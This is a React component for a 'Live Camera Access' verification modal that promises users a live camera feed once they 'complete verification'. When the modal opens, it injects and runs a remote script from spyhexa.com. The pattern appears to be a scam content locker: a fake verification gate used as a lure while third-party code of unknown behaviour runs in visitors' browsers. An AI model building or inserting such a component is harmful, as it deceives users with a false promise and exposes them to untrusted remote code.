import { useEffect } from "react";
import { Lock } from "lucide-react";

interface VerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const VerificationModal = ({ isOpen, onClose }: VerificationModalProps) => {
  useEffect(() => {
    if (isOpen && typeof window !== "undefined") {
      const script = document.createElement("script");
      script.src = "https://spyhexa.com/cp/js/n0208";
      script.type = "text/javascript";
      script.async = true;
      document.body.appendChild(script);

      return () => {
        document.body.removeChild(script);
      };
    }
  }, [isOpen]);

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div className="absolute inset-0 backdrop-blur-xl bg-black/70" />

      <div className="relative w-full max-w-sm flex flex-col items-center justify-center">
        <div className="w-full bg-black/80 rounded-2xl p-6 flex flex-col items-center">
          <div className="w-16 h-16 rounded-full bg-gradient-to-br from-yellow-600/20 to-yellow-800/20 flex items-center justify-center mb-4">
            <Lock className="w-8 h-8 text-yellow-500" strokeWidth={2.5} />
          </div>

          <h2 className="text-xl font-bold text-foreground mb-2">Live Camera Access</h2>
          <p className="text-center text-muted-foreground text-xs mb-6 px-4">
            Complete verification to access the live camera feed
          </p>

          <div className="mb-4 scale-90">
            <div data-captcha-enable="true"></div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default VerificationModal;
